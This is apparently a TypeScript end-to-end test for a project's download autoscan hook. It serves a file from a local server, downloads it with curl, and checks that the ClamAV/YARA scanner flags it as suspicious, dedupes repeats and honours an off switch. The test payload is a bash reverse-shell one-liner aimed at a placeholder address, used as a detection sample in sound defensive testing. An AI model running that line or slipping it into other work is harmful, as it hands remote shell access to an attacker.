/**
 * 下载后自动扫描的**端到端自证**（默认跳过；`PI_AUTOSCAN_E2E=1` 才跑）
 *
 * ## 为什么默认跳过
 *
 * 它会**真下载、真跑 `scripts/security-scan.mjs`**（`clamscan` 每次载库约 10 秒）⇒ 放进日常套件
 * 会把单测从"毫秒级"拖成"十几秒级" ✗。所以用 `describe.skipIf` 门控：**日常不跑，需要时显式复跑**。
 *
 * ## 它证明什么（补单测证明不了的那部分）
 *
 * 单测用注入的假依赖 ⇒ 证明**判据正确**；本测试用**真文件、真哈希、真子进程、真日志**证明
 * **"下载 → 钩子 → 扫描器 → 日志 → 提示"这条链路真的通**，而且：
 *   ① 载荷含**反弹 shell 特征** ⇒ 期望一路走到 `suspicious`（不是笼统的 clean/not-scanned）；
 *   ② 同内容再触发 ⇒ 必须 `skipped: dupe`（去重真的在用日志）；
 *   ③ `PI_AUTOSCAN=off` ⇒ **一行日志都不许新增**（开关真的能关）。
 *
 * 下载优先用本机 `curl`（最接近真实场景）；没有 curl 就退回 `fetch` —— **返回值里会说明用了哪个**。
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { createServer, type Server } from 'node:http';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createDefaultAutoscan } from '../budget/autoscan';

const ENABLED = process.env.PI_AUTOSCAN_E2E === '1';
/** 含 YARA 起始规则里的"bash 反弹 shell"特征 ⇒ 期望被 L2 命中 */
const PAYLOAD = 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n';

describe.skipIf(!ENABLED)('下载后自动扫描（端到端，真下载与真扫描）', () => {
  let dir = '';
  let port = 0;
  let srv: Server | undefined;
  let downloadedVia = '';

  beforeAll(async () => {
    dir = mkdtempSync(join(tmpdir(), 'autoscan-e2e-'));
    srv = createServer((_q, r) => {
      r.writeHead(200, { 'content-type': 'application/octet-stream' });
      r.end(PAYLOAD);
    });
    await new Promise<void>((r) => (srv as Server).listen(0, '127.0.0.1', r));
    const addr = (srv as Server).address();
    port = typeof addr === 'object' && addr !== null ? addr.port : 0;
    const target = join(dir, 'payload.bin');
    const url = `http://127.0.0.1:${port}/payload`;
    try {
      // 真下载（curl 优先；与本项目实际用法一致）
      execFileSync('curl', ['-sL', '-o', target, url], { timeout: 30_000 });
      downloadedVia = 'curl';
    } catch {
      const res = await fetch(url);
      writeFileSync(target, Buffer.from(await res.arrayBuffer()));
      downloadedVia = 'fetch（本机没有可用的 curl）';
    }
  }, 60_000);

  afterAll(() => {
    srv?.close();
    if (dir) rmSync(dir, { recursive: true, force: true });
  });

  it('真链路：可疑载荷 ⇒ suspicious、写入日志、提示原样带结论；去重与开关都真的生效', async () => {
    const cmd = `curl -sL -o ${join(dir, 'payload.bin')} http://127.0.0.1:${port}/payload`;
    const log = join(dir, 'security', 'autoscan.jsonl');
    const lines = (): Record<string, unknown>[] =>
      existsSync(log)
        ? readFileSync(log, 'utf8')
            .split('\n')
            .filter((l) => l.trim())
            .map((l) => JSON.parse(l) as Record<string, unknown>)
        : [];

    // 第一次：应真扫
    const a = createDefaultAutoscan(dir, '/root/my-pi');
    a.maybeStart(cmd, '/');
    const t0 = Date.now();
    while (Date.now() - t0 < 120_000 && !lines().some((r) => r.verdict !== undefined)) {
      await new Promise((r) => setTimeout(r, 500));
    }
    const first = lines().find((r) => r.verdict !== undefined);
    expect(first, `应当有一条带 verdict 的记录（下载方式：${downloadedVia}）`).toBeDefined();
    // ① 可疑载荷必须走到 suspicious —— 若某处把结论改写成 clean/not-scanned，这条会失败
    expect(first?.verdict).toBe('suspicious');
    expect(String(first?.layers)).toContain('L2_antivirus');
    // 提示必须原样带出结论（且**不是** clean）
    const notice = a.takeNotice() ?? '';
    expect(notice).toContain('suspicious');
    expect(notice).not.toContain('结论：clean');
    expect(notice).toContain(log);

    // ② 去重：同内容再触发 ⇒ dupe，且不再新增 verdict 记录
    const before = lines().length;
    createDefaultAutoscan(dir, '/root/my-pi').maybeStart(cmd, '/');
    await new Promise((r) => setTimeout(r, 1_500));
    const added = lines().slice(before);
    expect(added.some((r) => r.skipped === 'dupe')).toBe(true);
    expect(added.some((r) => r.verdict !== undefined)).toBe(false);

    // ③ 开关：off ⇒ 一行都不许新增
    process.env.PI_AUTOSCAN = 'off';
    const beforeOff = lines().length;
    try {
      createDefaultAutoscan(dir, '/root/my-pi').maybeStart(cmd, '/');
    } finally {
      delete process.env.PI_AUTOSCAN;
    }
    await new Promise((r) => setTimeout(r, 1_500));
    expect(lines().length).toBe(beforeOff);
  }, 180_000);
});
